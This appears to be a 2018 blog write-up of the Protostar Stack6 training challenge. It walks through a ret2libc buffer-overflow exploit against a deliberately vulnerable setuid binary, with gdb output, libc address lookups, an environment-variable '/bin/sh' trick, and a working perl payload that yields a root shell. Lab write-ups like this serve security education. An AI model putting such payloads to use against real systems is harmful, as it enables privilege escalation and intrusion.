---
layout: post
title:  "Protostar Stack6 challenge"
date:   2018-04-22 18:26:36 +0530
categories: exploit-exercises protostar stack6
---
[Stack6][stack6-proto-link] exercise has some restrictions on what addresses can we return to. If we try the usual method followed for [Stack5][stack5-proto-link] we're unable to spawn the shell. The source code for `Stack6` is

{% highlight cpp %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
{% endhighlight %}
The if condition `if((ret & 0xbf000000) == 0xbf000000)` is what prevents us from executing shell-code we keep in our stack.
The address of shellcode we had kept in stack began with `0xbf` making if condition true. Can we not place our shell code some where in stack not staring with `0xbf`. We check to see the range of addresses the stack is allocated. Perhaps thats not possible.
We can check that in gdb
{% highlight nasm %}
user@protostar:~$ gdb /opt/protostar/bin/stack6
(gdb) b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) r
Starting program: /opt/protostar/bin/stack6
Breakpoint 1, main (argc=1, argv=0xbffff884) at stack6/stack6.c:27
27	stack6/stack6.c: No such file or directory.
	in stack6/stack6.c
(gdb) info proc map
process 2206
cmdline = '/opt/protostar/bin/stack6'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fe0000 0xb7fe2000     0x2000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	`0xbffeb000 0xc0000000    0x15000          0           [stack]`
(gdb)
{% endhighlight %}
So memory mapped for stack area all start with `0xbf`. Thus we cannot execute code from our stack.
The challenge mentions `ret2libc(return to lib c)` which i used for this challenge. [Performing a ret2libc Attack][ret2libc-tut-link] provides a good explanation of how this attack works. You can use it as reference or any other of various articles about it.
I used the method mentioned in previous [tutorial for protostar stack6][stack5-tut-link] to find out offset of `RET` from `buffer`. Which comes out to be `80(0x50)` in this case.
Next we find out address of system(only takes one argument, a pointer to a string containing the path and name of
the program we want to execute) and exit commands
{% highlight nasm %}
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
{% endhighlight %}
Mentioned in [Performing a ret2libc Attack][ret2libc-tut-link] tutorial link is what how our payload should be structured. Our payload would be `[A*80][system][exit][cmd]`. `cmd` here will be the string `/bin/sh` or `/bin/bash`. Since `stack6` is a `setuid` program with owner as root, i should get root priviliges when shell is spawned. But after some failed attempts to use `/bin/bash` as cmd i found out that it drops root priviliges. But on trying with `/bin/sh` it did not drop root. Probably because of this [/bin/sh does not drop privileges][bin-sh-so-link].

Further there are two ways to pass `/bin/sh` to payload. Either through enviroment variable or storing the string in stack memory. Continuing on following the [Performing a ret2libc Attack][ret2libc-tut-link] i first tried with environment variable.
Instead of using C program as in tutorial to load /bin/sh to shell enviroment, simply do following in shell
{% highlight shell %}
user@protostar:~$ export EGG="/bin/sh"
{% endhighlight %}
Then create a C program to get its address
{% highlight cpp%}
user@protostar:~$ cat getenv.c
int main() {
	char *p = getenv("EGG");
	printf("ptr %p\n", p);
}
user@protostar:~$ ./getenv
ptr 0xbffffa24
{% endhighlight %}
But as mentioned in tutorial/over internet this address changes and depends upon calling program. So i fired up gdb to find actual address of EGG in `stack6` program. I try to search around the address found from sample C program above.
{% highlight nasm %}
user@protostar:~$ gdb /opt/protostar/bin/stack6
(gdb) b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) x/30s 0xbffffa24-30
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
0xbffffa06:	 <Address 0xbffffa06 out of bounds>
{% endhighlight %}
Here output shows i could not find `/bin/sh` string. On some previous trials i was able to find the string address as `0xbfffff97` but i was still unable to get shell using it, pointing out that the address was still different that used.
Luckily after some googling to find address of environment variable in a program, i came upon this helpful [genenvaddr][genenvaddr-link]. This is taken from page 147-148 of `Hacking: The Art of Exploitation, 2nd Edition` book and adjusts for name of executing program also being saved on stack which affects the environment variable location which is also stored on stack.
{% highlight shell %}
user@protostar:~$ ./getenvaddr EGG /opt/protostar/bin/stack6
EGG will be at 0xbffffa02
{% endhighlight %}
Combining all information found it was time to prepare payload as `perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x02\xfa\xff\xbf"'`
and use it. But initial attempts failed. The shell was being dropped.
{% highlight shell %}
user@protostar:~$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x02\xfa\xff\xbf"'  | /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA????`????
user@protostar:~$
user@protostar:~$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x02\xfa\xff\xbf"' > p
user@protostar:~$ /opt/protostar/bin/stack6 < p
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA????`????
user@protostar:~$
{% endhighlight %}
This was probably due to some issues with shell-redirection. But on doing it the same was as done was `stack5` i was able to get a root shell.
{% highlight shell %}
user@protostar:~$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x02\xfa\xff\xbf"' > p
user@protostar:~$ (cat p;cat) | /opt/protostar/bin/stack6
input path please:
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA????`????
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
{% endhighlight %}
So finally we were able to bypass the executable address checking by using `libc` calls. We used `system` call to `/bin/sh` stored in shell environment.
On why the payload was formatted in this manner, please read [Performing a ret2libc Attack][ret2libc-tut-link] in detail. This is must for building on all variants of `ret2libc` attacks.
And `exit` to gracefully exit from program after `system` return to it upon completion. `exit` also expects a parameter got around without passing. It would pick up any junk value after `[cmd]` and use it.
Next we will see how to do this by storing string `/bin/sh` in the stack itself.

[stack6-proto-link]:https://exploit.education/protostar/stack-six/
[stack5-proto-link]:https://exploit.education/protostar/stack-five/
[stack5-tut-link]:https://rawatm.github.io/exploit-exercises/protostar/stack5/2018/04/14/protostar-stack5/
[bin-sh-so-link]:https://stackoverflow.com/questions/13209215/bin-sh-does-not-drop-privileges
[genenvaddr-link]:https://gist.github.com/superkojiman/6a6e44db390d6dfc329a
[ret2libc-tut-link]:https://www.shellblade.net/docs/ret2libc.pdf